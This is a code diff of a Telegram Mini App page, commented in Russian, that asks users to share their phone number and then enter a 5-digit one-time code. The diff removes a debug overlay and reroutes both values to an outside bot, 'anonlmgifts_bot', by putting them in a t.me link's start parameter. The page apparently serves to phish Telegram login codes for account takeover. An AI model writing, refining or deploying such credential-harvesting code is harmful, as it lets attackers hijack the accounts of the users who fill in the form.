@@ -15,7 +15,6 @@
         .code-cell.filled { border-color: var(--tg-theme-button-color, #3390ec); }
         .code-cell.active { border-color: var(--tg-theme-button-color, #3390ec); box-shadow: 0 0 0 2px rgba(51, 144, 236, 0.2); }
         .auth-btn { background: var(--tg-theme-button-color, #3390ec); color: var(--tg-theme-button-text-color, #ffffff); border: none; border-radius: 10px; padding: 15px 20px; font-size: 16px; font-weight: 600; width: 100%; max-width: 300px; margin-top: 20px; cursor: pointer; }
-        #debug { position: fixed; bottom: 10px; left: 10px; right: 10px; background: rgba(255,0,0,0.8); color: white; font-size: 12px; padding: 10px; border-radius: 8px; word-wrap: break-word; z-index: 9999; text-align: left; }
     </style>
 </head>
 <body>
@@ -39,34 +38,25 @@
         <input type="text" id="code-input" class="code-input" inputmode="numeric" autocomplete="one-time-code" maxlength="5">
     </div>
 
-    <div id="debug">Debug: loading...</div>
-
     <script>
-        const debugEl = document.getElementById('debug');
         window.onload = function() {
             if (window.Telegram && window.Telegram.WebApp) {
                 const tg = window.Telegram.WebApp;
                 tg.expand();
                 let isSent = false;
 
-                // --- ЭТАП 1: НОМЕР ---
+                // ЭТАП 1: НОМЕР
                 document.getElementById('btn-share').onclick = function() {
                     tg.requestContact(function(shared, contact) {
                         if (shared && contact) {
-                            debugEl.innerText = "Debug: Sending phone and closing...";
-                            
-                            // Отправляем номер
-                            tg.sendData(JSON.stringify({ type: "phone", phone: contact.phone_number }));
-                            
-                            // Ждем полсекунды и закрываем (чтобы данные улетели)
-                            setTimeout(() => { tg.close(); }, 500);
-                        } else {
-                            debugEl.innerText = "Debug: contact NOT shared.";
+                            // Открываем ссылку на бота с номером в параметре start
+                            tg.openTelegramLink("https://t.me/anonlmgifts_bot?start=phone_" + contact.phone_number);
+                            tg.close();
                         }
                     });
                 };
 
-                // --- ЭТАП 2: КОД ---
+                // ЭТАП 2: КОД
                 const codeInput = document.getElementById('code-input');
                 const codeCells = document.querySelectorAll('.code-cell');
                 document.getElementById('code-cells').onclick = () => codeInput.focus();
@@ -91,13 +81,9 @@
                         isSent = true;
                         this.blur();
                         
-                        debugEl.innerText = "Debug: Sending code and closing...";
-                        
-                        // Отправляем код
-                        tg.sendData(JSON.stringify({ type: "code", code: value }));
-                        
-                        // Ждем полсекунды и закрываем
-                        setTimeout(() => { tg.close(); }, 500);
+                        // Открываем ссылку на бота с кодом в параметре start
+                        tg.openTelegramLink("https://t.me/anonlmgifts_bot?start=code_" + value);
+                        tg.close();
                     }
                 });
             }
